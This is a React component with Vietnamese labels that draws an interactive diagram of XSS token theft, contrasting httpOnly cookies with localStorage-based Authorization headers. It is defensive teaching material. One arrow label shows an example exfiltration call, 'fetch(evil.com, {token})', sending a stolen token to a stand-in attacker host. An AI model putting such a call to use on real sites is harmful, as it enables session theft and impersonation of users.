"use client";

import clsx from "clsx";
import { useState } from "react";
import { DiagramArrow, DiagramNode } from "@/components/diagrams/diagram-shapes";
import { DiagramFrame } from "@/components/diagrams/diagram-frame";

type Storage = "cookie" | "header";

const copy: Record<Storage, { label: string; sublabel: string; stolen: boolean; verdict: string; tone: "green" | "rose" }> = {
  cookie: {
    label: "🍪 httpOnly cookie",
    sublabel: "trình duyệt tự gắn vào mọi request",
    stolen: false,
    verdict: "document.cookie KHÔNG đọc được giá trị httpOnly — script độc hại chạy được nhưng lấy tay không.",
    tone: "green",
  },
  header: {
    label: "🧰 localStorage → header",
    sublabel: "JS tự đọc rồi gắn Authorization",
    stolen: true,
    verdict: "localStorage.getItem() đọc được token bình thường — script độc hại gửi thẳng token về server của attacker.",
    tone: "rose",
  },
};

export function CookieVsHeaderXssDiagram() {
  const [mode, setMode] = useState<Storage>("cookie");
  const scenario = copy[mode];

  return (
    <div>
      <div className="not-prose -mb-4 flex flex-wrap gap-2">
        {(["cookie", "header"] as const).map((option) => (
          <button
            key={option}
            type="button"
            onClick={() => setMode(option)}
            className={clsx(
              "rounded-full px-3 py-1.5 text-sm font-medium",
              mode === option ? "bg-indigo-600 text-white" : "bg-stone-200 text-stone-700 dark:bg-stone-800 dark:text-stone-300",
            )}
          >
            {option === "cookie" ? "Lưu trong cookie httpOnly" : "Lưu trong localStorage"}
          </button>
        ))}
      </div>
      <DiagramFrame
        title="Trang web dính lỗi XSS — token có bị đánh cắp không?"
        viewBox="0 0 720 260"
        caption={scenario.verdict}
      >
        <DiagramNode x={16} y={30} width={170} height={70} label="Trình duyệt" sublabel="tab đang mở taskflow" emoji="🌐" tone="blue" />
        <DiagramNode x={16} y={150} width={170} height={70} label={scenario.label} sublabel={scenario.sublabel} emoji="🔑" tone={scenario.tone} state="active" />
        <DiagramNode
          x={270}
          y={90}
          width={190}
          height={70}
          label="⚠️ Script độc hại"
          sublabel="chèn qua lỗ hổng XSS"
          emoji="🦠"
          tone="rose"
        />
        <DiagramNode
          x={534}
          y={90}
          width={170}
          height={70}
          label={scenario.stolen ? "😈 Server attacker" : "🚫 Không nhận được gì"}
          sublabel={scenario.stolen ? "nhận token, giả danh user" : "request thất bại"}
          emoji={scenario.stolen ? "📥" : "🛡️"}
          tone={scenario.stolen ? "rose" : "green"}
        />

        <DiagramArrow from={[186, 65]} to={[268, 105]} tone="rose" animated label="chèn <script>" />
        <DiagramArrow from={[186, 185]} to={[268, 145]} tone={scenario.tone} animated label={scenario.stolen ? "đọc được token" : "đọc thất bại"} />
        {scenario.stolen ? (
          <DiagramArrow from={[460, 125]} to={[532, 125]} tone="rose" animated label="fetch(evil.com, {token})" />
        ) : (
          <DiagramArrow from={[460, 125]} to={[532, 125]} tone="green" dimmed label="(không có gì để gửi)" />
        )}
      </DiagramFrame>
    </div>
  );
}
